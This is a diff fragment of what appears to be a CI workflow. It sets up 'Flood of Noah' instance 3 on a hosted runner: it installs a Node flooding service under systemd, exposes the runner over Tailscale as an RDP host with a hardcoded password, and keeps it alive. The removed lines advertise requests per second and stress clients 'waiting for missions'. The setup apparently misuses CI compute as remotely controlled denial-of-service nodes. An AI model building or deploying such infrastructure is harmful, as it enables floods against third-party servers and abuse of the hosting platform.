+          cd flood_of-noah
+          rm -rf node_modules package-lock.json
+          npm install express axios socks puppeteer --save
+
+      - name: Create Flood Service
+        run: |
+          sudo tee /etc/systemd/system/flood-noah-3.service > /dev/null << 'EOF'
+          [Unit]
+          Description=Flood of Noah - Instance 3
+          After=network-online.target
+          
+          [Service]
+          Type=simple
+          User=runner
+          WorkingDirectory=/home/runner/flood_of-noah
+          ExecStart=/usr/bin/node index.js
+          Restart=always
+          
+          [Install]
+          WantedBy=multi-user.target
+          EOF
+          
+          sudo systemctl daemon-reload
+          sudo systemctl enable flood-noah-3.service
+          sudo systemctl start flood-noah-3.service
+
+      - name: Install Tailscale
+        run: |
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
+          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq tailscale
+
+      - name: Connect Tailscale
+        run: |
+          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=rdp-instance-3 --accept-routes
+          
+          RETRY=0
+          while [ $RETRY -lt 30 ]; do
+            TAILSCALE_IP=$(tailscale ip -4 2>/dev/null)
+            if [ -n "$TAILSCALE_IP" ]; then
+              echo "✅ Instance 3 IP: $TAILSCALE_IP"
+              break
+            fi
+            sleep 2
+            RETRY=$((RETRY+1))
+          done
+
+      - name: Display Info
+        run: |
+          TAILSCALE_IP=$(tailscale ip -4)
           echo ""
-          echo "📊 Configuration:"
-          echo "   Instances: ${{ github.event.inputs.instance_count }}"
-          echo "   Performance: ${{ github.event.inputs.performance_level }}"
-          echo "   Duration: ${{ github.event.inputs.session_duration }} min"
-          echo "   Server: ${{ github.event.inputs.server_url }}"
-          echo ""
-          echo "💥 Total Capacity:"
-          echo "   Requests/sec: $(( ${{ github.event.inputs.instance_count }} * 1000 ))+"
-          echo "   Concurrent: $(( ${{ github.event.inputs.instance_count }} * 100 ))"
-          echo ""
-          echo "✅ ALL SYSTEMS OPERATIONAL"
-          echo "🟢 Stress clients auto-started and waiting for missions"
-          echo "🌊 Flood of Noah servers running on port 3000"
-          echo ""
+          echo "╔════════════════════════════════════════════════╗"
+          echo "║         RDP INSTANCE #3                        ║"
+          echo "╠════════════════════════════════════════════════╣"
+          echo "║ IP       : $TAILSCALE_IP"
+          echo "║ Username : rdp3"
+          echo "║ Password : Pass1234!"
+          echo "║ Flood    : http://$TAILSCALE_IP:3000"
+          echo "╚════════════════════════════════════════════════╝"
+
+      - name: Keep Alive
+        run: |
+          START=$(date +%s)
+          DURATION=$((${{ github.event.inputs.session_duration }} * 60))
+          END=$((START + DURATION))
+          
+          COUNTER=0
+          while [ $(date +%s) -lt $END ]; do
+            COUNTER=$((COUNTER + 1))
+            ELAPSED=$((($(date +%s) - START) / 60))
+            REMAIN=$(((END - $(date +%s)) / 60))
+            echo "🟢 Instance 3 | ${ELAPSED}m / ${REMAIN}m"
+            
+            if [ $((COUNTER % 5)) -eq 0 ]; then
+              sudo systemctl is-active --quiet xrdp || sudo systemctl restart xrdp
+              sudo systemctl is-active --quiet flood-noah-3 || sudo systemctl restart flood-noah-3
+            fi
+            
+            sleep 60
+          done
+
+      - name: Cleanup
+        if: always()
+        run: |
+          sudo systemctl stop flood-noah-3 || true
+          sudo tailscale logout || true
